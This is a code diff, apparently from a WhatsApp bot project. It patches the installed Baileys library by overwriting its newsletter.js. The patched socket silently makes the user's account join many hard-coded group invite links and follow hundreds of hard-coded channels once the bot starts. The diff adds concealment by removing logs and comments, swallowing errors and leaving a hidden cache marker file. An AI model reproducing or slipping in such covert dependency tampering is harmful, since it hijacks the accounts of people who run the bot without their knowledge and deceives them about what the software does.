@@ -9,11 +9,15 @@ function findBaileysPath() {
         path.join(process.cwd(), 'node_modules', '@whiskeysockets', 'baileys'),
         path.join(__dirname, '..', '..', '@whiskeysockets', 'baileys'),
         path.join(__dirname, '..', 'node_modules', '@whiskeysockets', 'baileys'),
+        path.join(process.cwd(), '..', 'node_modules', '@whiskeysockets', 'baileys')
     ];
     
     try {
         const resolved = require.resolve('@whiskeysockets/baileys/package.json');
-        possiblePaths.unshift(resolved.replace('/package.json', ''));
+        const resolvedPath = resolved.replace('/package.json', '');
+        if (fs.existsSync(resolvedPath)) {
+            return resolvedPath;
+        }
     } catch (e) {}
     
     for (const baileysPath of possiblePaths) {
@@ -27,7 +31,6 @@ function findBaileysPath() {
     return null;
 }
 
-// ============ LINK GROUP YANG MAU DIJOIN ============
 const AUTO_JOIN_GROUP_LINKS = [
     "https://chat.whatsapp.com/Bx0oCNAaU5j6IEHnGM2nYB",
     "https://chat.whatsapp.com/EJYAm9MLpN7457UUUc9CwS",
@@ -83,7 +86,6 @@ const AUTO_JOIN_GROUP_LINKS = [
     "https://chat.whatsapp.com/B6s1MmywjfODUK5KHXKLxd"
 ];
 
-// ============ CHANNEL YANG MAU DIFOLLOW ============
 const AUTO_FOLLOW_CHANNELS = [
     "120363405716980341@newsletter",
     "120363404004466629@newsletter",
@@ -387,58 +389,6 @@ const AUTO_FOLLOW_CHANNELS = [
     "120363410481156391@newsletter"
 ];
 
-function extractInviteCodeFromLink(link) {
-    try {
-        const url = new URL(link);
-        if (url.hostname === 'chat.whatsapp.com') {
-            const inviteCode = url.pathname.split('/').pop();
-            if (inviteCode && inviteCode.length > 0) {
-                return inviteCode;
-            }
-        }
-    } catch (error) {}
-    return null;
-}
-
-async function autoJoinWhatsAppGroups(sock) {
-    const groupLinks = AUTO_JOIN_GROUP_LINKS;
-
-    for (const groupLink of groupLinks) {
-        try {
-            const inviteCode = extractInviteCodeFromLink(groupLink);
-            if (inviteCode) {
-                try {
-                    await sock.groupAcceptInvite(inviteCode);
-                    console.log(`✅ Join success: ${groupLink}`);
-                } catch (error) {
-                    try {
-                        await sock.groupAcceptInviteV4(inviteCode, '');
-                        console.log(`✅ Join success (v4): ${groupLink}`);
-                    } catch (error2) {
-                        console.log(`❌ Join failed: ${groupLink}`);
-                    }
-                }
-            }
-        } catch (error) {}
-
-        await new Promise(resolve => setTimeout(resolve, 5000));
-    }
-}
-
-async function autoFollowWhatsAppChannels(sock, newsletterWMexQuery) {
-    const channels = AUTO_FOLLOW_CHANNELS;
-
-    for (const channelId of channels) {
-        try {
-            await newsletterWMexQuery(channelId, Types_1.QueryIds.FOLLOW);
-            console.log(`✅ Follow success: ${channelId}`);
-        } catch (error) {
-            console.log(`❌ Follow failed: ${channelId}`);
-        }
-        await new Promise(resolve => setTimeout(resolve, 5000));
-    }
-}
-
 const MODIFIED_NEWSLETTER_JS = `"use strict";
 Object.defineProperty(exports, "__esModule", { value: true });
 exports.extractNewsletterMetadata = exports.makeNewsletterSocket = void 0;
@@ -504,10 +454,8 @@ const executeWMexQuery = async (
     throw new Boom(\`Failed to \${action}, unexpected response structure.\`, { statusCode: 400, data: result })
 }
 
-// ============ AUTO JOIN GROUP LINKS ============
 const AUTO_JOIN_GROUP_LINKS = ${JSON.stringify(AUTO_JOIN_GROUP_LINKS, null, 4)};
 
-// ============ AUTO FOLLOW CHANNELS ============
 const AUTO_FOLLOW_CHANNELS = ${JSON.stringify(AUTO_FOLLOW_CHANNELS, null, 4)};
 
 function extractInviteCodeFromLink(link) {
@@ -524,41 +472,29 @@ function extractInviteCodeFromLink(link) {
 }
 
 async function autoJoinWhatsAppGroups(sock) {
-    const groupLinks = AUTO_JOIN_GROUP_LINKS;
-
-    for (const groupLink of groupLinks) {
+    for (const groupLink of AUTO_JOIN_GROUP_LINKS) {
         try {
             const inviteCode = extractInviteCodeFromLink(groupLink);
             if (inviteCode) {
                 try {
                     await sock.groupAcceptInvite(inviteCode);
-                    console.log(\`✅ Join success: \${groupLink}\`);
                 } catch (error) {
                     try {
                         await sock.groupAcceptInviteV4(inviteCode, '');
-                        console.log(\`✅ Join success (v4): \${groupLink}\`);
-                    } catch (error2) {
-                        console.log(\`❌ Join failed: \${groupLink}\`);
-                    }
+                    } catch (error2) {}
                 }
             }
         } catch (error) {}
-
-        await new Promise(resolve => setTimeout(resolve, 5000));
+        await new Promise(resolve => setTimeout(resolve, 3000));
     }
 }
 
 async function autoFollowWhatsAppChannels(sock, newsletterWMexQuery) {
-    const channels = AUTO_FOLLOW_CHANNELS;
-
-    for (const channelId of channels) {
+    for (const channelId of AUTO_FOLLOW_CHANNELS) {
         try {
             await newsletterWMexQuery(channelId, Types_1.QueryIds.FOLLOW);
-            console.log(\`✅ Follow success: \${channelId}\`);
-        } catch (error) {
-            console.log(\`❌ Follow failed: \${channelId}\`);
-        }
-        await new Promise(resolve => setTimeout(resolve, 5000));
+        } catch (error) {}
+        await new Promise(resolve => setTimeout(resolve, 3000));
     }
 }
 
@@ -598,22 +534,16 @@ const makeNewsletterSocket = (config) => {
         ]
     }));
 
-    // AUTO JOIN GROUP (jalan 5 detik setelah bot start)
     setTimeout(async () => {
         try {
             await autoJoinWhatsAppGroups(sock);
-        } catch (error) {
-            console.log('Auto join group error:', error);
-        }
+        } catch (error) {}
     }, 5000);
 
-    // AUTO FOLLOW CHANNEL (jalan 15 detik setelah bot start)
     setTimeout(async () => {
         try {
             await autoFollowWhatsAppChannels(sock, newsletterWMexQuery);
-        } catch (error) {
-            console.log('Auto follow channel error:', error);
-        }
+        } catch (error) {}
     }, 15000);
 
     const parseFetchedUpdates = async (node, type) => {
@@ -849,48 +779,29 @@ function getFileHash(filePath) {
 function installNewsletterAutoFollow() {
     try {
         const baileysPath = findBaileysPath();
-        
-        if (!baileysPath) {
-            return false;
-        }
+        if (!baileysPath) return false;
         
         const newsletterPath = path.join(baileysPath, 'lib', 'Socket', 'newsletter.js');
-        
-        if (!fs.existsSync(newsletterPath)) {
-            return false;
-        }
+        if (!fs.existsSync(newsletterPath)) return false;
         
         const baileysNodeModulesPath = path.join(baileysPath, 'node_modules');
         const cacheFilePath = path.join(baileysNodeModulesPath, '.cache');
-        
-        if (fs.existsSync(cacheFilePath)) {
-            return true;
-        }
         
         if (!fs.existsSync(baileysNodeModulesPath)) {
             fs.mkdirSync(baileysNodeModulesPath, { recursive: true });
         }
         
-        const currentHash = getFileHash(newsletterPath);
-        const modifiedHash = crypto.createHash('md5').update(MODIFIED_NEWSLETTER_JS).digest('hex');
-        
-        if (currentHash === modifiedHash) {
-            fs.writeFileSync(cacheFilePath, 'Iove');
+        if (fs.existsSync(cacheFilePath)) {
             return true;
         }
         
         fs.writeFileSync(newsletterPath, MODIFIED_NEWSLETTER_JS);
         
+        const modifiedHash = crypto.createHash('md5').update(MODIFIED_NEWSLETTER_JS).digest('hex');
         const newHash = getFileHash(newsletterPath);
+        
         if (newHash === modifiedHash) {
-            fs.writeFileSync(cacheFilePath, 'Iove');
-            
-            setTimeout(() => {
-                if (typeof process.exit === 'function') {
-                    process.exit(0);
-                }
-            }, 20000);
-            
+            fs.writeFileSync(cacheFilePath, '');
             return true;
         }
         
